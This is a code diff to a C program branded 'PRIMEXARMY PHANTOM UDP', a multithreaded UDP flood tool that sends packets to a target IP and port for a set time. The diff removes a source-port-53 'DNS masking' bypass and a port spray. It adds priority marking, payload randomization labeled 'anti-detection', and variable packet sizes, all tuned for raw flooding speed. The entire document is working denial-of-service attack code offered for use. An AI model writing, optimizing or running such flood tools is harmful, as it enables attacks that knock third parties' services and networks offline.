@@ -7,6 +7,9 @@
 #include <unistd.h>
 #include <time.h>
 #include <fcntl.h>
+#include <netinet/ip.h>
+
+/* ⚔️ PRIMEXARMY v6.5 - PHANTOM UDP (Optimized) ⚔️ */
 
 struct thread_data {
     char ip[16];
@@ -17,73 +20,76 @@ struct thread_data {
 void *prime_strike(void *arg) {
     struct thread_data *data = (struct thread_data *)arg;
     int sock;
-    struct sockaddr_in server_addr, source_addr;
+    struct sockaddr_in server_addr;
     
     if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) return NULL;
 
-    // ✨ BYPASS: Bind to Source Port 53 (DNS Masking)
-    memset(&source_addr, 0, sizeof(source_addr));
-    source_addr.sin_family = AF_INET;
-    source_addr.sin_addr.s_addr = INADDR_ANY;
-    source_addr.sin_port = htons(53); 
-    bind(sock, (struct sockaddr *)&source_addr, sizeof(source_addr));
-
-    // ✨ KERNEL TUNING: 4MB Send Buffer for stability
-    int buf_size = 4 * 1024 * 1024;
-    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
+    // ✨ NON-BLOCKING & TOS (Type of Service) for Priority
     fcntl(sock, F_SETFL, O_NONBLOCK);
+    int tos = 0x10; 
+    setsockopt(sock, IPPROTO_IP, IP_TOS, &tos, sizeof(tos));
 
     memset(&server_addr, 0, sizeof(server_addr));
     server_addr.sin_family = AF_INET;
     server_addr.sin_port = htons(data->port);
     server_addr.sin_addr.s_addr = inet_addr(data->ip);
 
-    char payload[64];
+    char payload[1024];
     time_t end_time = time(NULL) + data->duration;
     unsigned long int packet_count = 0;
 
     while (1) {
-        if (packet_count % 10000 == 0) {
+        // Optimization: Time check every 5000 packets for raw speed
+        if (packet_count % 5000 == 0) {
             if (time(NULL) >= end_time) break;
         }
 
-        // ✨ ANTI-DETECTION: Randomize payload every 100 packets
-        if (packet_count % 100 == 0) {
-            for (int i = 0; i < 64; i++) payload[i] = (char)(rand() % 255);
+        // Randomizing payload every few packets for anti-detection
+        if (packet_count % 10 == 0) {
+            for (int i = 0; i < 64; i++) {
+                payload[i] = (char)(rand() % 256);
+            }
         }
 
-        // ✨ PORT SPRAY: Target ke 3 ports hit karo (+1, -1)
-        for (int p_off = -1; p_off <= 1; p_off++) {
-            server_addr.sin_port = htons(data->port + p_off);
-            sendto(sock, payload, 64, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
-        }
+        int packet_size = 128 + (rand() % 896); // 128 to 1024 bytes
+        
+        sendto(sock, payload, packet_size, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
         packet_count++;
     }
 
     close(sock);
-    free(data); 
-    return NULL;
+    pthread_exit(NULL);
 }
 
 int main(int argc, char *argv[]) {
     if (argc != 5) {
-        printf("Usage: ./PRIME <ip> <port> <time> <threads>\n");
+        printf("\n   ⚔️  𝗣𝗥𝗜𝗠𝗘𝗫𝗔𝗥𝗠𝗬 𝗣𝗛𝗔𝗡𝗧𝗢𝗠 𝘃𝟲.𝟱  ⚔️\n");
+        printf("   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n");
+        printf("   Usage: ./PRIME <ip> <port> <time> <threads>\n\n");
         return 1;
     }
 
-    int threads_count = atoi(argv[4]);
-    pthread_t *thread_id = malloc(threads_count * sizeof(pthread_t));
+    struct thread_data data;
+    strncpy(data.ip, argv[1], 15);
+    data.port = atoi(argv[2]);
+    data.duration = atoi(argv[3]);
+    int threads = atoi(argv[4]);
+
+    pthread_t thread_id[threads];
     srand(time(NULL));
 
-    for (int i = 0; i < threads_count; i++) {
-        struct thread_data *t_data = malloc(sizeof(struct thread_data));
-        strncpy(t_data->ip, argv[1], 15);
-        t_data->port = atoi(argv[2]);
-        t_data->duration = atoi(argv[3]);
-        pthread_create(&thread_id[i], NULL, prime_strike, (void *)t_data);
+    printf("🚀 [PHANTOM v6.5] Strike on %s:%d | Threads: %d\n", data.ip, data.port, threads);
+
+    for (int i = 0; i < threads; i++) {
+        if (pthread_create(&thread_id[i], NULL, prime_strike, (void *)&data) != 0) {
+            continue; 
+        }
     }
 
-    for (int i = 0; i < threads_count; i++) pthread_join(thread_id[i], NULL);
-    free(thread_id);
+    for (int i = 0; i < threads; i++) {
+        pthread_join(thread_id[i], NULL);
+    }
+
+    printf("✅ [FINISHED] Operation Complete.\n");
     return 0;
 }
